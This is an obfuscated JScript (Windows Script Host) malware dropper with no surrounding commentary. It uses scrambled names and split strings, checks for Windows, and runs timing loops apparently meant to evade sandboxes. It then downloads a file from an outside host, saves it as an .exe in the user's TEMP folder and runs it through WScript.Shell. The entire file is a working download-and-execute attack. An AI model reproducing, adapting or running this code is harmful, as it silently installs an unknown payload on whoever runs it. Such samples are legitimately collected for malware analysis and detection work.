var y = false;
var gz = "CreateObject";
var Uj = function w() {return WScript[gz]("WScript.Shell");}(), N = 11;
var e = "MSXML2.XMLHTTP";
var SL = 2123213;
var a = 0;
function OS(A){Uj["Run"](A, a, a);};
function b(){return "" + e;};
function FS(t, Ax){a = a * 1; return t - Ax;};
function XE(){return gz;};
/*@cc_on
  @if (@_win32 || @_win64)
    y = true;
  @end
@*/
if (y)
{
var pl = "";
function k0(){return 22;};
var m = 0; var A0 = 0;
function ZV()
{
var U = new this["Date"]();
var s = U["getUTCMilliseconds"]();
WScript["Sleep"](k0());
var U = new this["Date"]();
var ba = U["getUTCMilliseconds"]();
WScript["Sleep"](k0());
var U = new this["Date"]();
var S = U["getUTCMilliseconds"]();
var m = "YF";
m = FS(ba, s);
var A0 = "kj";
A0 = FS(S, ba);
pl = "open";
return FS(m, A0);
}
var Pr = false;
var kC = false;
for (var LX = a; LX < k0() * 1; LX++){if (ZV() != a){
Pr = true; 
A0 = "31" + 11 * m + A0; 
kC = true; 
break;
}}
function gH() {return ((Pr == true) && (Pr == kC)) ? 1 : a;};
if (Pr && gH() && kC){
function p() {return Uj["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "SmHpDHN4Ka.exe";};
 as = b();
 e0 = WScript[gz](as);
 var v = 1;
 while (v){
try {
e0[pl]("GET", "http://dealingdeuces.com/o4pskd", false);
e0["send"]();
c = "Sleep";
for (;;){WScript[c](k0() * 11); if (e0["readystate"] >= 2 * 2) break;};
v = a;
} catch(A1){};
}
function k(jv) {var uz = (1, 2, 3, 4, 5, jv); return uz;};
o = WScript[XE()]("ADODB.Stream");
as = o;
as[pl]();
as["type"] = k(1);
as["write"](e0["ResponseBody"]);
o["position"] = k(a);
as["Save" + "ToFile"](p(), 2);
o["c"+"lose"]();
K = p();
OS(K);
}
}

